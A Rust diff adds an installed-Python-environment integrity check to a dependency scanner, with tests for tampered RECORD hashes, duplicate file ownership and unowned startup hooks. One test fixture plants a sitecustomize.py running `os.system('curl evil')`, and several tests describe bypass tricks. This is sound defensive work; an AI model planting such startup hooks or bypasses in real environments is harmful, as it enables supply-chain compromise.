@@ -1740,6 +1740,12 @@ pub struct EcosystemScanReport {
     pub online: bool,
     /// Notes about coverage — unreadable manifests, truncation, missing DB.
     pub notes: Vec<ScanNote>,
+    /// B5: installed-distribution integrity, in `--installed` mode only. Carries
+    /// the per-distribution RECORD verification and the cross-distribution
+    /// ownership findings. `skip_serializing_if = Option::is_none` so the
+    /// manifest/lockfile modes (which never compute it) keep byte-identical JSON.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub integrity: Option<InstalledIntegrityReport>,
     /// The verdict: every finding from every non-allowlisted dependency.
     pub verdict: Verdict,
 }
@@ -1911,6 +1917,21 @@ pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
             findings.extend(policy_findings_for_assessment(assessment, effective_policy));
         }
     }
+
+    // B5 installed-distribution integrity: only in `--installed` mode (the
+    // manifest/lockfile modes do not have a real installed tree to verify). The
+    // pass builds the ownership index once per site-packages root, runs the lax
+    // installed-RECORD verifier per distribution, scans the site root for startup
+    // hooks, and correlates the granular signals into one
+    // `PythonInstalledIntegrityViolation` finding folded into the same verdict.
+    let integrity = if matches!(request.mode, ScanMode::Installed) {
+        let report = collect_installed_integrity(request.root, request.installed_max_entries);
+        findings.extend(report.correlated_findings(effective_policy));
+        Some(report)
+    } else {
+        None
+    };
+
     // tier_reached is 3 — `ecosystem scan` does the full analysis. Assemble via
     // the shared finalizer so policy `action_overrides` (and severity overrides
     // and paranoia) are honored here, not only on the engine hot path.
@@ -1928,6 +1949,7 @@ pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
         assessments,
         online,
         notes,
+        integrity,
         verdict,
         mode: request.mode.as_str(),
     }
@@ -2358,29 +2380,398 @@ fn walk_site_packages(
     }
 }
 
-/// Parse a PEP 566 METADATA file's `Name:` and `Version:` headers.
+/// Parse a PEP 566 METADATA file's `Name:` and `Version:` headers, reusing the
+/// shared header loop in [`crate::artifact::wheel::parse_metadata_headers`] so the
+/// installed-tree scan and the artifact parsers cannot drift on what a
+/// name/version is. The extra `is_plausible_package_name` gate is specific to the
+/// scan (it filters a junk `Name:` out of the dependency list); a name that fails
+/// it is dropped here, yielding `None`.
 fn read_dist_info_metadata(path: &Path) -> Option<(String, Option<String>)> {
-    let text = std::fs::read_to_string(path).ok()?;
-    let mut name: Option<String> = None;
-    let mut version: Option<String> = None;
-    // Headers stop at the first blank line; the body is unneeded description.
-    for line in text.lines() {
-        if line.is_empty() {
-            break;
+    // No-follow, like every other `.dist-info` read: a planted METADATA symlink must
+    // not be followed out of the environment (std::fs::read_to_string follows links).
+    let bytes = crate::util::read_text_no_follow_capped(path, 4 * 1024 * 1024).ok()?;
+    let text = String::from_utf8(bytes).ok()?;
+    let (name, version) = crate::artifact::wheel::parse_metadata_headers(&text)?;
+    if !is_plausible_package_name(&name) {
+        return None;
+    }
+    Some((name, version))
+}
+
+// ---------------------------------------------------------------------------
+// B5 installed-distribution integrity
+// ---------------------------------------------------------------------------
+
+/// One normalized installed path owned by two or more distributions, for the
+/// serialized report. The cross-distribution loader/payload split surfaces as a
+/// duplicate-ownership here.
+#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
+pub struct DuplicateOwnership {
+    /// The normalized installed path both distributions claim.
+    pub path: String,
+    /// The names of the distributions that both list `path` in their RECORD.
+    pub owners: Vec<String>,
+}
+
+/// B5 installed-distribution integrity over one or more `site-packages` roots.
+/// Carries the per-root coverage and the granular integrity signals; the
+/// correlation into the single user-facing
+/// [`RuleId::PythonInstalledIntegrityViolation`] finding is
+/// [`InstalledIntegrityReport::correlated_findings`]. Serialized onto
+/// [`EcosystemScanReport`] only in `--installed` mode.
+#[derive(Debug, Clone, Default, Serialize)]
+pub struct InstalledIntegrityReport {
+    /// The `site-packages` roots that were scanned (root-relative-ish display
+    /// strings).
+    pub site_packages_roots: Vec<String>,
+    /// How many installed distributions had their RECORD verified.
+    pub distributions_checked: usize,
+    /// How many distributions had NO RECORD (a coverage gap, not a violation).
+    pub records_missing: usize,
+    /// How many RECORD-listed files did not match their on-disk bytes.
+    pub hash_mismatches: usize,
+    /// Paths owned by more than one distribution (the duplicate-ownership / cross-
+    /// distribution split).
+    pub duplicate_owned_paths: Vec<DuplicateOwnership>,
+    /// `sitecustomize.py`/`usercustomize.py` files present at a site root but
+    /// owned by no installed distribution's RECORD (an unowned startup hook: the
+    /// strongest B5 corroborator).
+    pub unowned_startup_hooks: Vec<String>,
+    /// Startup-execution inventory present at a site root (`.pth`/`.start`/
+    /// `.egg-link`). INVENTORY only in B5: these are recorded for the B6 startup
+    /// analyzer and are NOT a standalone finding here.
+    pub startup_inventory: Vec<String>,
+    /// Every granular signal collected (RECORD mismatch, duplicate-owned,
+    /// sitecustomize-unowned), the evidence the correlation lists.
+    pub signals: Vec<crate::artifact::ArtifactSignal>,
+}
+
+impl InstalledIntegrityReport {
+    /// Whether any integrity SIGNAL was recorded (a missing RECORD on its own is
+    /// not a signal: it is a coverage gap counted in `records_missing`).
+    fn has_signal(&self) -> bool {
+        !self.signals.is_empty()
+    }
+
+    /// Correlate the granular signals into AT MOST ONE user-facing
+    /// [`RuleId::PythonInstalledIntegrityViolation`] finding (cross-cutting
+    /// invariant 1: few user-facing findings, detail carried as signals). Returns
+    /// an empty vec when there is no signal.
+    ///
+    /// Severity is Medium by default (installed-environment drift is common). It
+    /// rises to High ONLY with corroboration B5 can establish: an UNOWNED startup
+    /// hook (`sitecustomize.py`/`usercustomize.py` owned by no distribution),
+    /// which the plan lists as a High corroborator. A strict integrity policy
+    /// further upgrades the ACTION to Block via `action_overrides`, applied by
+    /// `finalize_static_verdict`; this function does not itself force Block.
+    fn correlated_findings(&self, _policy: &crate::policy::Policy) -> Vec<Finding> {
+        if !self.has_signal() {
+            return Vec::new();
         }
-        if let Some(rest) = line.strip_prefix("Name:") {
-            let val = rest.trim();
-            if !val.is_empty() && is_plausible_package_name(val) {
-                name = Some(val.to_string());
+
+        // Corroboration: an unowned startup hook elevates the default Medium to
+        // High (a hook that executes at every interpreter start and belongs to no
+        // package is the serious case; a bare RECORD mismatch in a possibly
+        // conda/distro/editable tree is not, by itself).
+        let corroborated = !self.unowned_startup_hooks.is_empty();
+        let severity = if corroborated {
+            Severity::High
+        } else {
+            Severity::Medium
+        };
+
+        // Build a compact evidence list from the distinct signal kinds, plus the
+        // concrete offending items, so the single finding names what it correlated.
+        let mut evidence: Vec<Evidence> = Vec::new();
+        let kinds = self.distinct_signal_kinds();
+        evidence.push(Evidence::Text {
+            detail: format!("correlated integrity signals: {}", kinds.join(", ")),
+        });
+        for hook in &self.unowned_startup_hooks {
+            evidence.push(Evidence::Text {
+                detail: format!("unowned startup hook: {hook}"),
+            });
+        }
+        for dup in &self.duplicate_owned_paths {
+            evidence.push(Evidence::Text {
+                detail: format!(
+                    "path '{}' owned by multiple distributions: {}",
+                    dup.path,
+                    dup.owners.join(", ")
+                ),
+            });
+        }
+        if self.hash_mismatches > 0 {
+            evidence.push(Evidence::Text {
+                detail: format!(
+                    "{} RECORD hash mismatch(es) against on-disk bytes",
+                    self.hash_mismatches
+                ),
+            });
+        }
+
+        let title = if corroborated {
+            "Installed Python environment integrity violation (unowned startup hook)".to_string()
+        } else {
+            "Installed Python environment integrity violation".to_string()
+        };
+        let description = format!(
+            "The installed environment failed an integrity check: {}. Installed-environment \
+             drift is common (conda, distro packaging, build instrumentation, editable \
+             installs), so this is Medium by default and only rises with corroboration such \
+             as an unowned startup hook. Review the named files and reinstall affected \
+             distributions from a trusted source; set a strict integrity policy \
+             (action_overrides) to block on this.",
+            kinds.join(", ")
+        );
+
+        vec![Finding {
+            rule_id: RuleId::PythonInstalledIntegrityViolation,
+            severity,
+            title,
+            description,
+            evidence,
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        }]
+    }
+
+    /// The distinct signal-kind wire strings present, sorted, for the evidence
+    /// summary.
+    fn distinct_signal_kinds(&self) -> Vec<String> {
+        let mut kinds: BTreeSet<String> = BTreeSet::new();
+        for s in &self.signals {
+            // The signal kind serializes to its snake_case name.
+            if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
+                kinds.insert(k);
             }
-        } else if let Some(rest) = line.strip_prefix("Version:") {
-            let val = rest.trim();
-            if !val.is_empty() {
-                version = Some(val.to_string());
+        }
+        kinds.into_iter().collect()
+    }
+}
+
+/// Run the B5 installed-integrity pass over every `site-packages` root under
+/// `root`. For each root it builds a duplicate-aware ownership index across all
+/// distributions, verifies each distribution's RECORD leniently, and scans the
+/// root for unowned `sitecustomize.py`/`usercustomize.py` startup hooks (plus
+/// inventories `.pth`/`.start`/`.egg-link` for the later B6 analyzer). Never
+/// follows a symlinked final component when reading a file. Best-effort: an
+/// unreadable directory contributes nothing rather than failing the scan.
+fn collect_installed_integrity(root: &Path, max_entries: usize) -> InstalledIntegrityReport {
+    use crate::artifact::record::{
+        index_distribution_ownership, verify_installed_record, EnvironmentLayout, FileVerification,
+        OwnershipIndex,
+    };
+    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
+    use crate::location::SubjectLocation;
+
+    let mut report = InstalledIntegrityReport::default();
+
+    for site in find_site_packages_dirs(root) {
+        report.site_packages_roots.push(site.display().to_string());
+        let layout = EnvironmentLayout::for_site_packages(site.clone());
+
+        // Discover every `.dist-info` in this root and its distribution identity.
+        let dist_infos = discover_dist_infos(&site);
+
+        // 1. Ownership index across ALL distributions in this root (duplicate
+        //    ownership is what we detect, so it must be cross-distribution).
+        let mut index = OwnershipIndex::new();
+        for (dist_info, identity) in &dist_infos {
+            index_distribution_ownership(dist_info, identity, &mut index);
+        }
+
+        // 2. Per-distribution lenient RECORD verification, BOUNDED by `max_entries` (the
+        //    caller's --installed scan cap, 0 = unlimited): verification hashes every
+        //    RECORD-listed file, so a large environment must not bypass the cap and make
+        //    `--installed` unexpectedly expensive. The cheaper ownership index above stays
+        //    full so cross-distribution duplicate detection is not weakened.
+        let verify_cap = if max_entries == 0 {
+            usize::MAX
+        } else {
+            max_entries
+        };
+        for (dist_info, identity) in dist_infos.iter().take(verify_cap) {
+            let result = verify_installed_record(dist_info, &layout, identity, false);
+            report.distributions_checked += 1;
+            // An externally-managed distribution (conda / distro-packaged) legitimately
+            // diverges from its RECORD (post-install patching), and its integrity is owned
+            // by that package manager, not pip's RECORD. Per `externally_managed`'s
+            // documented purpose ("avoid over-flagging"), it does NOT feed the integrity
+            // violation - otherwise a clean conda env would fire
+            // PythonInstalledIntegrityViolation (and Block under a strict action policy).
+            // The strong corroborator (an UNOWNED startup hook) is collected separately,
+            // so a genuinely-tampered managed package is still caught by that High signal.
+            if result.externally_managed {
+                continue;
             }
+            if result.record_missing {
+                report.records_missing += 1;
+            }
+            for entry in &result.entries {
+                if matches!(entry.verification, FileVerification::Mismatch { .. }) {
+                    report.hash_mismatches += 1;
+                }
+            }
+            report.signals.extend(result.signals);
+        }
+
+        // 3. Duplicate-owned paths -> a signal each.
+        for (path, owners) in index.duplicates() {
+            let owner_names: Vec<String> = owners.iter().map(|d| d.name.clone()).collect();
+            report.duplicate_owned_paths.push(DuplicateOwnership {
+                path: path.as_str().to_string(),
+                owners: owner_names.clone(),
+            });
+            report.signals.push(ArtifactSignal {
+                kind: ArtifactSignalKind::DuplicateOwnedFile,
+                location: SubjectLocation::installed(site.join(path.as_str())),
+                evidence: format!(
+                    "installed path '{}' is owned by multiple distributions: {}",
+                    path,
+                    owner_names.join(", ")
+                ),
+                confidence: EdgeConfidence::Medium,
+            });
+        }
+
+        // 4. Scan the site root for startup hooks. `sitecustomize.py` /
+        //    `usercustomize.py` owned by NO distribution is a corroborating
+        //    signal; `.pth`/`.start`/`.egg-link` are INVENTORY (for B6), not a
+        //    finding here.
+        scan_site_root_startup(&site, &index, &mut report);
+    }
+
+    report
+}
+
+/// Discover every `<name>-<version>.dist-info` directory in a `site-packages`
+/// root, returning each with its `DistributionIdentity` (read from METADATA).
+fn discover_dist_infos(site: &Path) -> Vec<(PathBuf, crate::artifact::DistributionIdentity)> {
+    use crate::artifact::DistributionIdentity;
+    use crate::location::SubjectLocation;
+
+    let mut out: Vec<(PathBuf, DistributionIdentity)> = Vec::new();
+    let Ok(rd) = std::fs::read_dir(site) else {
+        return out;
+    };
+    let mut dist_infos: Vec<PathBuf> = rd
+        .filter_map(Result::ok)
+        // Use the DirEntry's file type (NO symlink follow): a planted
+        // `foo.dist-info -> /outside` symlink must not be accepted as a dist-info directory
+        // and route later METADATA/RECORD reads through the symlink (the no-follow read
+        // helpers protect only the FINAL component). The directory must be a REAL directory.
+        .filter(|e| {
+            // Case-INsensitive `.dist-info` match: on a case-insensitive filesystem a tampered
+            // distribution installed as `Evil-1.0.DIST-INFO` still imports, but a case-sensitive
+            // suffix check would skip it entirely - so its RECORD integrity is never verified and
+            // its duplicate-owned paths / unowned startup hooks are never detected.
+            e.file_type().map(|ft| ft.is_dir()).unwrap_or(false)
+                && e.file_name()
+                    .to_str()
+                    .is_some_and(|n| n.to_ascii_lowercase().ends_with(".dist-info"))
+        })
+        .map(|e| e.path())
+        .collect();
+    dist_infos.sort();
+    for dist_info in dist_infos {
+        let metadata = dist_info.join("METADATA");
+        let (name, version) = match read_dist_info_metadata(&metadata) {
+            Some(nv) => nv,
+            // Fall back to the directory name when METADATA is unreadable, so the
+            // distribution still participates in ownership/duplicate detection.
+            None => match dist_info_dir_identity(&dist_info) {
+                Some(nv) => nv,
+                None => continue,
+            },
+        };
+        out.push((
+            dist_info.clone(),
+            DistributionIdentity {
+                ecosystem: Ecosystem::PyPI,
+                name,
+                version,
+                dist_info_path: SubjectLocation::installed(dist_info),
+            },
+        ));
+    }
+    out
+}
+
+/// Parse `<name>-<version>.dist-info` -> `(name, Some(version))` from the
+/// directory name, a fallback identity when METADATA is unreadable.
+fn dist_info_dir_identity(dist_info: &Path) -> Option<(String, Option<String>)> {
+    let dir = dist_info.file_name()?.to_str()?;
+    let stem = dir.strip_suffix(".dist-info")?;
+    let idx = stem.rfind('-')?;
+    let (name, version) = stem.split_at(idx);
+    let version = &version[1..];
+    if name.is_empty() || version.is_empty() {
+        return None;
+    }
+    Some((name.to_string(), Some(version.to_string())))
+}
+
+/// Scan a `site-packages` root (top level only) for startup-execution files. An
+/// unowned `sitecustomize.py`/`usercustomize.py` emits a `SitecustomizeUnowned`
+/// signal AND is recorded in `unowned_startup_hooks`; `.pth`/`.start`/`.egg-link`
+/// are recorded in `startup_inventory` only (B6 analyzes them).
+fn scan_site_root_startup(
+    site: &Path,
+    index: &crate::artifact::record::OwnershipIndex,
+    report: &mut InstalledIntegrityReport,
+) {
+    use crate::artifact::record::NormalizedInstalledPath;
+    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
+    use crate::location::SubjectLocation;
+
+    let Ok(rd) = std::fs::read_dir(site) else {
+        return;
+    };
+    let mut names: Vec<(String, PathBuf)> = rd
+        .filter_map(Result::ok)
+        .filter_map(|e| {
+            let p = e.path();
+            let n = p.file_name()?.to_str()?.to_string();
+            Some((n, p))
+        })
+        .collect();
+    names.sort();
+
+    for (name, path) in names {
+        let lower = name.to_ascii_lowercase();
+        if lower == "sitecustomize.py" || lower == "usercustomize.py" {
+            // Owned by a distribution? Probe ownership under BOTH the site-relative
+            // filename and the file's absolute path: a conda/system RECORD may list
+            // sitecustomize.py with an absolute path, so a bare-filename probe alone
+            // would miss it and raise a false SitecustomizeUnowned (Block) on a hook
+            // that is legitimately owned.
+            let key = NormalizedInstalledPath::new(&name);
+            let abs_key = NormalizedInstalledPath::new(&path.to_string_lossy());
+            if !index.is_owned(&key) && !index.is_owned(&abs_key) {
+                report
+                    .unowned_startup_hooks
+                    .push(path.display().to_string());
+                report.signals.push(ArtifactSignal {
+                    kind: ArtifactSignalKind::SitecustomizeUnowned,
+                    location: SubjectLocation::installed(path.clone()),
+                    evidence: format!(
+                        "{name} present at the site-packages root but owned by no installed \
+                         distribution (executes at interpreter start)"
+                    ),
+                    confidence: EdgeConfidence::High,
+                });
+            }
+        } else if lower.ends_with(".pth")
+            || lower.ends_with(".start")
+            || lower.ends_with(".egg-link")
+        {
+            // Inventory for B6; not a standalone finding in B5.
+            report.startup_inventory.push(path.display().to_string());
         }
     }
-    name.map(|n| (n, version))
 }
 
 /// Walk `vendor/` for vendored Go modules (`host/owner/repo`-shaped names).
@@ -4028,6 +4419,395 @@ version = "1.0.61"
                 .any(|n| n.note.contains("not a recognized manifest format")),
             "must record a 'not recognized' note for an unknown file: {:?}",
             report.notes
+        );
+    }
+
+    // ---- B5: installed-distribution integrity (end-to-end via scan) -----------
+
+    /// A `sha256=<base64url-no-pad>` RECORD hash column for `bytes`.
+    fn record_hash_col(bytes: &[u8]) -> String {
+        use base64::Engine as _;
+        use sha2::{Digest, Sha256};
+        let digest = Sha256::digest(bytes);
+        format!(
+            "sha256={}",
+            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest)
+        )
+    }
+
+    /// Plant a full installed PyPI distribution under `<root>/site-packages`:
+    /// a `.dist-info/METADATA`, the given package files on disk, and a RECORD
+    /// listing each file (`hash_matches` controls whether the recorded hash
+    /// matches the bytes written; `false` plants a tamper). Extra `.dist-info`
+    /// files (INSTALLER, direct_url.json) come from `extra_dist_info`. Returns the
+    /// site-packages path.
+    fn plant_installed_dist(
+        root: &Path,
+        name: &str,
+        version: &str,
+        files: &[(&str, &[u8])],
+        hash_matches: bool,
+        extra_dist_info: &[(&str, &[u8])],
+    ) -> PathBuf {
+        let site = root.join("site-packages");
+        let dist_info = site.join(format!("{name}-{version}.dist-info"));
+        std::fs::create_dir_all(&dist_info).unwrap();
+        std::fs::write(
+            dist_info.join("METADATA"),
+            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
+        )
+        .unwrap();
+        for (extra_name, body) in extra_dist_info {
+            std::fs::write(dist_info.join(extra_name), body).unwrap();
+        }
+        let mut record = String::new();
+        for (rel, body) in files {
+            let p = site.join(rel);
+            if let Some(parent) = p.parent() {
+                std::fs::create_dir_all(parent).unwrap();
+            }
+            std::fs::write(&p, body).unwrap();
+            let hash_body: &[u8] = if hash_matches {
+                body
+            } else {
+                b"DIFFERENT bytes"
+            };
+            record.push_str(&format!(
+                "{rel},{},{}\n",
+                record_hash_col(hash_body),
+                body.len()
+            ));
+        }
+        // RECORD lists itself with empty hash/size.
+        record.push_str(&format!("{name}-{version}.dist-info/RECORD,,\n"));
+        std::fs::write(dist_info.join("RECORD"), record).unwrap();
+        site
+    }
+
+    fn installed_request<'a>(root: &'a Path) -> ScanRequest<'a> {
+        ScanRequest {
+            root,
+            db: None,
+            online: OnlineMode::Off,
+            is_allowlisted: &never_allow,
+            mode: ScanMode::Installed,
+            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
+            policy: None,
+        }
+    }
+
+    #[test]
+    fn discover_dist_infos_matches_dist_info_case_insensitively() {
+        // On a case-insensitive filesystem an UPPERCASE `.DIST-INFO` dir still imports; it must
+        // be discovered so its RECORD integrity is verified (and duplicate/unowned detection
+        // runs), not skipped because of a case-sensitive suffix check.
+        let tmp = tempfile::tempdir().unwrap();
+        let site = tmp.path();
+        let di = site.join("Evil-1.0.DIST-INFO");
+        std::fs::create_dir_all(&di).unwrap();
+        std::fs::write(di.join("METADATA"), b"Name: evil\nVersion: 1.0\n").unwrap();
+        let found = discover_dist_infos(site);
+        assert!(
+            found.iter().any(|(p, _)| p.ends_with("Evil-1.0.DIST-INFO")),
+            "an uppercase .DIST-INFO dir must be discovered: {found:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_tampered_file_fires_violation() {
+        let dir = tempfile::tempdir().unwrap();
+        // hash_matches: false plants a RECORD hash that disagrees with the bytes.
+        plant_installed_dist(
+            dir.path(),
+            "demo",
+            "1.0",
+            &[("demo/mod.py", b"on-disk bytes\n")],
+            false,
+            &[],
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report
+            .integrity
+            .as_ref()
+            .expect("installed mode reports integrity");
+        assert!(integrity.hash_mismatches >= 1, "a tamper must mismatch");
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "a tampered installed file must fire the integrity violation; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_unowned_sitecustomize_fires_high() {
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "demo",
+            "1.0",
+            &[("demo/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        // Plant a sitecustomize.py at the site root that NO distribution owns.
+        std::fs::write(
+            site.join("sitecustomize.py"),
+            b"import os; os.system('curl evil')\n",
+        )
+        .unwrap();
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert_eq!(integrity.unowned_startup_hooks.len(), 1);
+        let finding = report
+            .verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::PythonInstalledIntegrityViolation)
+            .expect("unowned sitecustomize must fire the integrity violation");
+        // An unowned startup hook is the High corroborator -> Block.
+        assert_eq!(finding.severity, Severity::High);
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    /// A sitecustomize.py whose owning distribution lists it in RECORD by ABSOLUTE
+    /// path (as conda/system installs do) is OWNED, so it must NOT raise a false
+    /// SitecustomizeUnowned (which would Block a clean environment).
+    #[test]
+    fn sitecustomize_owned_via_absolute_record_path_is_not_unowned() {
+        let dir = tempfile::tempdir().unwrap();
+        let site = dir.path().join("site-packages");
+        std::fs::create_dir_all(&site).unwrap();
+        let hook = site.join("sitecustomize.py");
+        std::fs::write(&hook, b"import sys\n").unwrap();
+        // A distribution that owns sitecustomize.py, listing it by ABSOLUTE path.
+        let dist_info = site.join("owner-1.0.dist-info");
+        std::fs::create_dir_all(&dist_info).unwrap();
+        std::fs::write(
+            dist_info.join("METADATA"),
+            "Metadata-Version: 2.1\nName: owner\nVersion: 1.0\n",
+        )
+        .unwrap();
+        std::fs::write(dist_info.join("RECORD"), format!("{},,\n", hook.display())).unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.unowned_startup_hooks.is_empty(),
+            "sitecustomize owned via an absolute RECORD path must not be flagged unowned"
+        );
+    }
+
+    /// `read_dist_info_metadata` must not follow a symlinked METADATA out of the
+    /// environment (it reads no-follow like every other `.dist-info` read).
+    #[test]
+    #[cfg(unix)]
+    fn dist_info_metadata_symlink_is_not_followed() {
+        use std::os::unix::fs::symlink;
+        let dir = tempfile::tempdir().unwrap();
+        let dist_info = dir.path().join("pkg-1.0.dist-info");
+        std::fs::create_dir_all(&dist_info).unwrap();
+        let outside = dir.path().join("outside-metadata");
+        std::fs::write(
+            &outside,
+            "Metadata-Version: 2.1\nName: sneaky\nVersion: 9.9\n",
+        )
+        .unwrap();
+        symlink(&outside, dist_info.join("METADATA")).unwrap();
+        assert!(read_dist_info_metadata(&dist_info.join("METADATA")).is_none());
+    }
+
+    #[test]
+    fn integrity_duplicate_owned_path_fires_violation() {
+        let dir = tempfile::tempdir().unwrap();
+        let site = dir.path().join("site-packages");
+        // Two distributions whose RECORD both list the SAME module path.
+        for (name, ver) in [("alpha", "1.0"), ("beta", "2.0")] {
+            let dist_info = site.join(format!("{name}-{ver}.dist-info"));
+            std::fs::create_dir_all(&dist_info).unwrap();
+            std::fs::write(
+                dist_info.join("METADATA"),
+                format!("Metadata-Version: 2.1\nName: {name}\nVersion: {ver}\n"),
+            )
+            .unwrap();
+            // Both list `shared/mod.py` (empty hash so neither mismatches).
+            std::fs::write(dist_info.join("RECORD"), "shared/mod.py,,\n").unwrap();
+        }
+        let shared = site.join("shared");
+        std::fs::create_dir_all(&shared).unwrap();
+        std::fs::write(shared.join("mod.py"), b"shared\n").unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert_eq!(
+            integrity.duplicate_owned_paths.len(),
+            1,
+            "the shared path must be detected as duplicate-owned"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(rules.contains(&RuleId::PythonInstalledIntegrityViolation));
+    }
+
+    #[test]
+    fn integrity_benign_numpy_shaped_so_no_block() {
+        // A NumPy-shaped distribution: a compiled .so LISTED in RECORD with a
+        // matching hash must not block.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "numpyish",
+            "1.26.0",
+            &[
+                ("numpyish/__init__.py", b"from . import _core\n"),
+                (
+                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
+                    b"\x7fELF fake\n",
+                ),
+            ],
+            true,
+            &[],
+        );
+        let report = scan(&installed_request(dir.path()));
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "a NumPy-shaped dist with a listed, matching .so must not block"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "a clean compiled wheel must produce no integrity violation; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_benign_editable_install_no_block() {
+        // An editable install: a sparse RECORD (listing only the dist-info and a
+        // .pth-style pointer) and absent project files must not block.
+        let dir = tempfile::tempdir().unwrap();
+        let site = dir.path().join("site-packages");
+        let dist_info = site.join("proj-0.1.0.dist-info");
+        std::fs::create_dir_all(&dist_info).unwrap();
+        std::fs::write(
+            dist_info.join("METADATA"),
+            "Metadata-Version: 2.1\nName: proj\nVersion: 0.1.0\n",
+        )
+        .unwrap();
+        // direct_url.json marks it editable.
+        std::fs::write(
+            dist_info.join("direct_url.json"),
+            br#"{"url":"file:///home/me/proj","dir_info":{"editable":true}}"#,
+        )
+        .unwrap();
+        // RECORD references a project file that is NOT on disk (editable installs
+        // legitimately point outside site-packages) plus RECORD itself.
+        std::fs::write(
+            dist_info.join("RECORD"),
+            "proj/__init__.py,sha256=AAAA,10\nproj-0.1.0.dist-info/RECORD,,\n",
+        )
+        .unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(integrity.distributions_checked >= 1);
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "an editable install must not block on a sparse/absent-file RECORD"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "an editable install must not fire the integrity violation; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_benign_distro_managed_no_block() {
+        // A distro/conda-style install: an INSTALLER naming a non-pip installer,
+        // and unverifiable (empty-hash) RECORD rows. Divergence is legitimate; no
+        // block.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "distropkg",
+            "3.0",
+            &[("distropkg/__init__.py", b"# distro\n")],
+            true,
+            &[("INSTALLER", b"conda\n")],
+        );
+        let report = scan(&installed_request(dir.path()));
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "a distro/conda-managed install must not block"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(!rules.contains(&RuleId::PythonInstalledIntegrityViolation));
+    }
+
+    #[test]
+    fn integrity_externally_managed_mismatch_does_not_violate() {
+        // A conda/distro package whose installed bytes DIVERGE from its RECORD (the real
+        // post-install-patching case, not just empty/unverifiable hashes) must NOT fire
+        // the integrity violation: its integrity is owned by that package manager, per
+        // the `externally_managed` flag.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "patchedpkg",
+            "2.0",
+            &[("patchedpkg/__init__.py", b"# patched\n")],
+            false, // RECORD hashes DIVERGE from the installed bytes
+            &[("INSTALLER", b"conda\n")],
+        );
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "an externally-managed package's RECORD divergence must not fire a violation"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn integrity_non_utf8_installer_is_not_externally_managed() {
+        // A non-UTF-8 INSTALLER must NOT count as "externally managed" (which would skip
+        // the integrity check): an attacker could otherwise write one junk byte to
+        // INSTALLER to bypass RECORD verification. With a divergent (tampered) RECORD, the
+        // violation must still fire.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "sneaky",
+            "1.0",
+            &[("sneaky/__init__.py", b"# real\n")],
+            false, // RECORD hashes diverge (tamper)
+            &[("INSTALLER", b"\xff\xfe not utf8")],
+        );
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "a non-UTF-8 INSTALLER must not bypass integrity via a false externally-managed"
+        );
+    }
+
+    #[test]
+    fn integrity_absent_in_manifests_mode() {
+        // The integrity report is only computed in `--installed` mode, so a
+        // manifest-mode scan must leave it None (byte-identical JSON invariant).
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"dependencies":{"left-pad":"1.0.0"}}"#,
+        )
+        .unwrap();
+        let mut req = installed_request(dir.path());
+        req.mode = ScanMode::Manifests;
+        let report = scan(&req);
+        assert!(
+            report.integrity.is_none(),
+            "manifest-mode scan must not compute an integrity report"
         );
     }
 }
